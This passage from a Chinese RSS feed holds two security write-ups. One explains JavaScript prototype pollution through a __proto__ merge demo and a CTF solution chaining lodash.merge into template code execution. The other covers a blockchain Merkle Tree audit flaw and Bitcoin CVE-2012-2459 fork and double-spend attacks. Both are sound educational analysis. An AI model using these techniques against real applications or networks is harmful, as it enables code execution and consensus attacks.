{&amp;#34;b&amp;#34;: 2}}&amp;#39;) merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) &lt;/p&gt;&lt;p&gt;可见，新建的o3对象，也存在b属性，说明Object已经被污染：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_b.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;430&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;650&quot; data-original=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_b.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;430&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;650&quot; data-original=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-a51b1f8cd603e76d62ce9036765f971b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;这是因为，JSON解析的情况下，&lt;code&gt;__proto__&lt;/code&gt;会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。&lt;/p&gt;&lt;p&gt;merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。&lt;/p&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%230x05-code-breaking-2018-thejs&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;0x05 Code-Breaking 2018 Thejs 分析&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;这里&lt;/a&gt;）：&lt;/p&gt;&lt;p&gt;// ... const lodash = require(&amp;#39;lodash&amp;#39;) // ... app.engine(&amp;#39;ejs&amp;#39;, function (filePath, options, callback) { // define the template engine fs.readFile(filePath, (err, content) =&amp;gt; { if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled({...options}) return callback(null, rendered) }) }) //... app.all(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; { let data = req.session.data || {language: [], category: []} if (req.method == &amp;#39;POST&amp;#39;) { data = lodash.merge(data, req.body) req.session.data = data } res.render(&amp;#39;index&amp;#39;, { language: data.language, category: data.category }) }) &lt;/p&gt;&lt;p&gt;lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;lodash.template&lt;/code&gt; 一个简单的模板引擎&lt;/li&gt;&lt;li&gt;&lt;code&gt;lodash.merge&lt;/code&gt; 函数或对象的合并&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。&lt;/p&gt;&lt;p&gt;而这里的&lt;code&gt;lodash.merge&lt;/code&gt;操作实际上就存在原型链污染漏洞。&lt;/p&gt;&lt;p&gt;在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的&lt;code&gt;lodash.template&lt;/code&gt;中。我们看到&lt;code&gt;lodash.template&lt;/code&gt;的代码：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/lodash/lodash/blob/4.17.4-npm/template.js%23L165&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/lodash/lodas&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;h/blob/4.17.4-npm/template.js#L165&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;// Use a sourceURL for easier debugging. var sourceURL = &amp;#39;sourceURL&amp;#39; in options ? &amp;#39;//# sourceURL=&amp;#39; + options.sourceURL + &amp;#39;\n&amp;#39; : &amp;#39;&amp;#39;; // ... var result = attempt(function() { return Function(importsKeys, sourceURL + &amp;#39;return &amp;#39; + source) .apply(undefined, importsValues); }); &lt;/p&gt;&lt;p&gt;options是一个对象，sourceURL取到了其&lt;code&gt;options.sourceURL&lt;/code&gt;属性。这个属性原本是没有赋值的，默认取空字符串。&lt;/p&gt;&lt;p&gt;但因为原型链污染，我们可以给所有Object对象中都插入一个&lt;code&gt;sourceURL&lt;/code&gt;属性。最后，这个&lt;code&gt;sourceURL&lt;/code&gt;被拼接进&lt;code&gt;new Function&lt;/code&gt;的第二个参数中，造成任意代码执行漏洞。&lt;/p&gt;&lt;p&gt;我将带有&lt;code&gt;__ptoto__&lt;/code&gt;的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_b.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;122&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;650&quot; data-original=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_b.jpg&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;122&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;650&quot; data-original=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-42c5b8d5250c459c70997fc136f61760_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;可见，我们代码执行成功，返回了id命令的结果。&lt;/p&gt;&lt;p&gt;整个案例我觉得是一个非常经典的原型链污染漏洞教程，代码不多，逻辑不复杂，没有刻意创造漏洞，真正触发漏洞的代码在库中。&lt;/p&gt;&lt;p&gt;我一直觉得，出题不要刻意创造漏洞，而是找找你的知识点是否能在真实环境下找到应用。&lt;/p&gt;&lt;h2&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%23_1&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;相关文章&lt;/a&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/HoLyVieR/pro&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;totype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/2802&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;xz.aliyun.com/t/2802&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/2735&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;xz.aliyun.com/t/2735&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-09-28-61990774</guid>
<pubDate>Sat, 28 Sep 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>区块链公链审计过程中遇到的Merkle Tree底层实现问题 及CVE-2012-2459分析</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-09-28-60064645.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/60064645&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c3847e11fc0d5797a282550a8883f5c2_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;前言&lt;/b&gt;&lt;/p&gt;&lt;p&gt;区块链项目态势汹涌，在经历了比特币、以太坊时代之后，大量拥有着不同特点与优势的公链项目如雨后春笋般层出不穷，吸引着人们的眼球。&lt;/p&gt;&lt;p&gt;这些项目既拥有区块链1.0、2.0时代中，数字货币交易、去中心化、支持智能合约的特征，也通过更加巧妙的共识机制、更复杂的技术和金融模型，来解决现有的种种问题，助区块链技术步入我们的生活。&lt;/p&gt;&lt;p&gt;&lt;b&gt;在此期间，长亭科技区块链安全组也在关注着诸多公链项目，为这些公链项目的发展与上线保驾护航。&lt;/b&gt;在此前一项公链审计的项目过程中，我们发现了一个有意思的关于 Merkle Tree 底层实现漏洞。下面将分享发现该漏洞的前期技术积累，以及发现过程。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;公链项目审计&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回顾2018年，对于区块链安全从业人员而言，大部分人印象颇深的可能都是以太坊的诸多合约漏洞，EOS 公链上层出不穷的合约问题，以及少数公链漏洞信息。使用搜索引擎查找和区块链相关的审计类文章，也大多为智能合约的 checklist、智能合约的审计分析等，针对公链审计类的技术分享并无很多。&lt;b&gt;这里推荐大家一份由长亭科技编写的国内首发的&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651371613%26idx%3D1%26sn%3Dc28a33f408fa34988e6fcc2082f56238%26chksm%3D8d39c9d5ba4e40c30ebfc4cdd864474ea7e10d9dc1793d052ca9803fe90cb1e985fe33f3ae00%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;《区块链安全生存指南》&lt;/a&gt;&lt;b&gt;，其中介绍了当下区块链行业环境，以及近年来区块链业内的一些著名事件等。同时分享长亭科技日前发布的&lt;/b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzIwNDA2NDk5OQ%3D%3D%26mid%3D2651372563%26idx%3D2%26sn%3D5496dcfd278c2d11c8cad17aee99fb23%26chksm%3D8d39cd9bba4e448d8ced57e6dfa7df8bd905d24c71d46a3025f900f1f9e91057eeffa70abada%26scene%3D21%23wechat_redirect&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;《公链审计checklist》&lt;/a&gt;&lt;b&gt;，以供公链项目开发者参考。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;审计区块链公链项目，与通常的软件代码审计略有不同。通常的代码审计，我们会考虑语言特性以及该语言的 0day 或 1day 漏洞，结合常见业务场景，分析代码的实现。&lt;b&gt;区块链公链项目，其本身代码量较多，在项目背后，还有严谨的金融货币模型以及共识模型，且无较为实用的审计工具，需要更多以来人工审计，审计的定制化程度高，难度及工作量大。依我理解，我们主要从以下方向入手：&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;语言特性及其已知漏洞&lt;br/&gt;底层实现【密码学、序列化、大数运算等】&lt;br/&gt;区块链基本元素的实现【区块、交易、链】&lt;br/&gt;区块链行为的逻辑【生成一个区块、交易进入 tx_pool 等】&lt;br/&gt;区块链的其他组件【p2p、rpc、钱包等】&lt;br/&gt;共识算法合理性&lt;br/&gt;金融模型合理性&lt;br/&gt;历史公链漏洞&lt;/blockquote&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞发现过程&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在审计过程中发现的漏洞利用方式，源于该公链项目在实现 Merkle Tree 逻辑时，与常规实现方式有些许不同。在整理之前比特币区块链、以太坊区块链，出现过的漏洞时，发现了可能利用的漏洞点，经过确认发现可以影响不同节点间达成共识，进而造成分叉。&lt;/p&gt;&lt;p&gt;&lt;b&gt;在发现问题后，长亭科技立刻汇报给公链项目方，公链开发者响应迅速，非常重视此次安全问题，即刻完成了修复。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;什么是 Merkle Tree&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Merkle Tree，一般也称为 Merkle Hash Tree。是数据结构中我们所了解的树，其各个节点均包含 Hash 值。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Merkle Tree 具有以下的特点：&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;它是一棵树，具有数据结构中，树结构的所有特点。【在讲解中我们默认其为二叉树】&lt;/li&gt;&lt;li&gt;Merkle Tree 的叶子节点中存放数据。非叶子节点的 value，是由其左右两子节点，经过组合和 Hash 运算获得。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;让我们举个例子来表示：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-83202c519637271c10b9d061a6b8ce08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;我们可以看到，只有叶子节点中存放了 Data【Tx Hash】，而其上面每一个非叶子节点的 value，都是他们孩子的 value，经过组合和哈希运算得到的。&lt;/p&gt;&lt;p&gt;Merkle Tree 被广泛应用于对比以及验证处理。&lt;b&gt;在区块链技术中，Merkle Tree 被用于验证各区块中的交易，在传输过程中是否被篡改。&lt;/b&gt;因为我们可以看到，倘若修改任一叶子节点的内容，这棵 Merkle Tree 的 root 节点的值【Merkle 根】就会随之改变，可以通过判断 Merkle 根来得知，该区块中，有交易可能传输出错或被恶意篡改。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-e18f671e9b07b13a615eb4bfd7efd1e7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;&lt;b&gt;审计中发现的实现方式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;核心代码【有修改】：&lt;/p&gt;&lt;p&gt;# 外层为循环，以建立Merkle Tree&lt;/p&gt;&lt;p&gt;if hashList[i+1] == None :&lt;/p&gt;&lt;p&gt;    hashList[p] = sha3(hashList[i]+hashList[i])&lt;/p&gt;&lt;p&gt;else :&lt;/p&gt;&lt;p&gt;  if hashList[i] &amp;gt; hashList[i+1] :&lt;/p&gt;&lt;p&gt;        hashList[p] = sha3(hashList[i]+hashList[i+1])&lt;/p&gt;&lt;p&gt;  else:&lt;/p&gt;&lt;p&gt;        hashList[p] = sha3(hashList[i+1]+hashList[i])&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;在审计过程中，当考察到 Merkle Tree 底层实现方式时，发现其实现有一定违和感，具体如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;先根据 tx_hash 数量，建立一棵完全二叉树&lt;/li&gt;&lt;li&gt;将 tx_hash，按顺序放至叶子节点中&lt;/li&gt;&lt;li&gt;通过以下算法算得上层节点的 Hash 值：&lt;/li&gt;&lt;ol&gt;&lt;li&gt;对于某一非叶子节点，将其两孩子的 value 进行比较，&lt;b&gt;序列大者靠前&lt;/b&gt;&lt;/li&gt;&lt;li&gt;将排好的两孩子，进行Hash运算，得到的 Hash 值为该节点的 value&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;如此往复，建立 Merkle Tree，算得根节点的 value&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;举例说明：&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;519&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;519&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-6f7bfce653946b214480f74ce1c68f56_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;初看此处时，觉得实现 Merkle Tree 的方式有些奇怪，进行了一次两孩子的 value 比较，但想到 Merkle Tree 的主要意义在于校验，防止篡改。实现方式略有不同可能影响不大，遂只做了记录。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Bitcoin 漏洞CVE-2012-2459&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在整理曾经出现的公链漏洞时，发现了这样一个有名的比特币 DoS 漏洞。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;354&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;354&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-0b948b04d9f067e633fce750dbb79d03_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;通过了 Merkle Root 的根认证的区块，但其实并不合法。可能导致区块链分叉，或是进行双花攻击等，危害性较高，攻击方式较为简单，我们来分析该漏洞成因。&lt;/p&gt;&lt;p&gt;在旧版本的 Bitcoin 客户端中，其实现 Merkle Tree 的建立【计算该区块交易的 Merkle 根】的过程和通常的方式没有太大区别，当区块中交易个数为奇数时，会进行一个这样的操作：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;575&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-d82d17eb5df21b113137c0f7a69ad371_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;在计算 Merkle 根时，若其叶子节点的个数为奇数个，则复制最后一笔交易的 Hash 值，参与建立 Merkle Tree【并不是复制一笔交易出来，不能有重复的交易】。&lt;/p&gt;&lt;p&gt;看上去没有什么太大的问题，只是计算 Merkle 根时，对边界的处理。但 CVE-2012-2459 漏洞，利用的就是这一个特性。&lt;/p&gt;&lt;p&gt;&lt;b&gt;区块A：&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_b.jpg&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;238&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;568&quot; data-original=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_b.jpg&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;238&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;568&quot; data-original=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-73cf9bedcc46ccff5dbc3459d28a781d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;攻击者首先选择一个有奇数笔交易的区块，构造区块时，将最后一笔交易复制一份，加入该区块中。&lt;/p&gt;&lt;p&gt;&lt;b&gt;区块B:&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_b.jpg&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;297&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;568&quot; data-original=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_b.jpg&quot; data-rawwidth=&quot;568&quot; data-rawheight=&quot;297&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;568&quot; data-original=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-5d4dae1f039cdd88a958f386286a3fe1_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;506&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_b.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;506&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-9711d698a37a11934161755d786d319e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;区块A是一个正常的区块，区块B是拥有重复交易的区块。在共识过程中，会因为 tx_3 和 tx_2 一致，而造成出错并抛弃。但这两个区块根据上面的描述，对应的 Merkle 根是一致的。对应的区块头也是一致的。&lt;/p&gt;&lt;p&gt;&lt;b&gt;攻击者可以构造同样的区块头，在传播广播区块时，广播不同交易列表的区块信息，导致网络中接收到原区块的节点认为此区块有效，接收到恶意区块的节点认为此区块无效，造成不同节点面对这一区块不能达到共识，进而使区块链分叉，或是进行双花攻击等，危害极大。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞利用方式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回到我们的审计过程中，类似上面的例子，思考在此项目中是否也会有类似的攻击手法。&lt;/p&gt;&lt;p&gt;我们发现，对于任意两笔相邻的交易，我们可以调换他们的位置，来使 Merkle 根不变，更有甚者，我们可以交换任意一个节点下，两个孩子为根的树的位置，也不会改变 Merkle 根的值。&lt;/p&gt;&lt;p&gt;&lt;b&gt;经过对于其他部分对区块和交易的校验分析之后，我们发现可以通过构造两笔特定的交易，造成和上面比特币区块链类似的攻击效果。&lt;/b&gt;经过攻击链的设计和验证后，验证了此方法的可能性。此公链在运行过程中，有可能因此漏洞，被进行强制分叉或是双花攻击等。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;汇报该漏洞后，公链项目方十分重视这一问题，响应迅速，立刻修复了该实现问题。&lt;/p&gt;&lt;p&gt;在审计该项目的一些底层实现过程中，我们审计到这个较为经典的漏洞，并根据此漏洞，构造了一条完整的攻击链，达到了对公链强制分叉的影响。这也提醒了我们： &lt;b&gt;代码千万行，安全第一行。实现不规范，首席两行泪。&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fc05b37019760c9652d86299a7047340_b.png&quot; data-rawwidth=&quot;73&quot; data-rawheight=&quot;72&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;content_image&quot; width=&quot;73&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fc05b37019760c9652d86299a7047340_b.png&quot; data-rawwidth=&quot;73&quot; data-rawheight=&quot;72&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; class=&quot;content_image lazy&quot; width=&quot;73&quot; 